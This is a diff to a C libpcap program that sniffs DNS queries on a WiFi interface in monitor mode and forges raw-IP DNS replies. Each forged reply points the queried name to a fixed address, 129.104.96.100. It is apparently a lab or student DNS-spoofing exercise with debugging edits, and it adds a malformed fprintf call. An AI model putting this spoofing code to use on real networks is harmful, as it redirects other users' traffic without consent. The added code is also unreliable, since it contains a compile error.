@@ -41,8 +41,7 @@ int main(int argc, char *argv[])
 	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
 	char *dev_name;
 	bpf_u_int32 net_ip, mask;
-
-
+	/*
 	//get all available devices
 	if(pcap_findalldevs(&all_dev, err_buf))
 	{
@@ -75,12 +74,13 @@ int main(int argc, char *argv[])
 	dev_name = malloc(20);
 	fgets(dev_name, 20, stdin);
 	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end
-
+	*/
 	//look up the chosen device
-	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
+	int ret = pcap_lookupnet("wlp2s0", &net_ip, &mask, err_buf);
 	if(ret < 0)
 	{
-		fprintf(stderr, "Error looking up net: %s \n", dev_name);
+		printf("Error looking up dev_name\n");
+		//fprintf(stderr, "Error looking up net: %s \n", dev_name);
 		exit(1);
 	}
 
@@ -96,7 +96,7 @@ int main(int argc, char *argv[])
 	printf("Mask: %s\n", ip_char);
 
 	//Create the handle
-	if (!(handle = pcap_create(dev_name, err_buf))){
+	if (!(handle = pcap_create("mon0", err_buf))){
 		fprintf(stderr, "Pcap create error : %s", err_buf);
 		exit(1);
 	}
@@ -104,7 +104,7 @@ int main(int argc, char *argv[])
 	//If the device can be set in monitor mode (WiFi), we set it.
 	//Otherwise, promiscuous mode is set
 	if (pcap_can_set_rfmon(handle)==1){
-		print("mm set\n");
+		printf("mm set\n");
 		if (pcap_set_rfmon(handle, 1))
 			pcap_perror(handle,"Error while setting monitor mode");
 	}
@@ -143,11 +143,13 @@ int main(int argc, char *argv[])
 
 	if(handle == NULL)
 	{
-		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
+		fprintf(stderr, "Unable to open device : %s\n", err_buf);
+		//fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
 		exit(1);
 	}
 
-	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);
+	fprintf("Device is opened. Begin sniffing with filter %s...\n", filter_exp);
+	//printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);
 
 	logfile=fopen("log.txt","w");
 	if(logfile==NULL)
@@ -218,7 +220,7 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	//	parse the dns query
 	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);
 
-
+	if(((dns_header* )dns_buff)->qd_count==0) return;
 	/******************now build the reply using raw IP ************/
 	uint8_t send_buf[BUF_SIZE]; //sending buffer
 	bzero(send_buf, BUF_SIZE);
@@ -230,11 +232,13 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
     build_dns_header(dnshdr,id,1,0,1,0,0);
 	res_record* rrf =(res_record*)(dnshdr+sizeof(dns_header));
 	r_element* answer=rrf->element;
+	printf("here2");
 	answer->type=htons(TYPE_A);
     answer->rdlength=htons(4);
     answer->ttl=htonl(1000);
     answer->_class=htons(CLASS_IN);
 	rrf->name=queries[0].qname;
+	printf("here3");
 	inet_pton(AF_INET,"129.104.96.100",rrf->rdata);
 
 	printf("past dns\n");
